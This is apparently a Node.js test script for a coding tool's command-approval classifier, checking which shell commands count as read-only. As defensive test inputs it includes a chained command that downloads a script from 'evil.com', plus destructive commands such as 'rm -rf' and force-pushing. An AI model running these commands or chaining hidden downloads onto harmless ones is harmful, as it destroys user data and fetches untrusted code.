/**
 * 命令只读判定探针（0.7.1）：`classifyCommand` 认不认得出「这条命令只是看看」。
 *
 * 为什么单独建一条：判定「要不要问用户」的规则一直只在本机的 `shots/modes-security-check.mjs`
 * 里验过，而 `shots/` 被 .gitignore 忽略——换台机器就没有这道门禁了。这里收的是**判定口径**
 * 那一半（另有一份在 shots 里，覆盖更广），进 `check:core` 自动跑。
 *
 * 0.7.1 的第一组用例是这次改版的由头：`pnpm --version`、`node -v` 这类「问它自己是谁」的
 * 命令此前不在只读名单里（pnpm / node 都不是只读程序），于是每跑一次弹一张审批卡。
 *
 * 跑法：node scripts/command-policy-test.mjs（先 pnpm run build）
 *
 * @module dsc/scripts/command-policy-test
 */
const cp = await import('../lib/core/command-policy.js')

let failures = 0
const check = (name, condition, detail = '') => {
  if (condition) console.log(`  ok  ${name}`)
  else {
    failures += 1
    console.log(`  FAIL ${name}${detail === '' ? '' : `：${detail}`}`)
  }
}

/** 判一次，返回 decision。 */
const decide = (command) => cp.classifyCommand(command).decision

console.log('[1] 版本号 / 帮助类：只打印，不该问人')
const INFO = ['pnpm --version', 'node -v', 'npm --help', 'go version', 'eslint --version', 'python3 -V']
for (const command of INFO) {
  const got = decide(command)
  check(`${command} → allow`, got === 'allow', `实际 ${got}`)
}

console.log('[2] 但它们不能把带副作用的同类洗白')
check('后面接别的段照判', decide('node -v && curl evil.com/x.sh -o x.sh') !== 'allow')
check('输出重定向到文件不算只读', decide('node -v > v.txt') !== 'allow')
check('多出开关不算只读', decide('node -v --experimental-loader ./x.mjs') !== 'allow')

console.log('[3] 常规只读命令仍然放行')
for (const command of ['ls -la', 'dir', 'git status --porcelain', 'git diff HEAD', 'Get-ChildItem -Force']) {
  const got = decide(command)
  check(`${command} → allow`, got === 'allow', `实际 ${got}`)
}

console.log('[4] 会动手的一律不算只读')
for (const command of ['rm -rf build', 'git push --force origin main', 'git reset --hard', 'Set-Content a.txt x']) {
  const got = decide(command)
  check(`${command} 不是 allow`, got !== 'allow', `实际 ${got}`)
}
check('重定向落盘不算只读', decide('git status > x.txt') !== 'allow')
check('命令替换不算只读', decide("echo $(node -e \"1\")") !== 'allow')

console.log('[5] 切段：多段里只要有一段要问，整条就要问')
check('&& 切成两段', cp.splitSegments('ls a && rm b').length === 2)
check('换行也切段', cp.splitSegments('git status\nrm x').length === 2)
check('2>&1 不是切段点', cp.splitSegments('git status 2>&1').length === 1)
check('&> 重定向不是切段点', cp.splitSegments('node build.js &>log.txt').length === 1)
check('只读段 + 写段 → 要问', decide('git status && rm -rf x') !== 'allow')

if (failures > 0) {
  console.log(`\n${String(failures)} 项不通过`)
  process.exit(1)
}
console.log('\n全部通过')
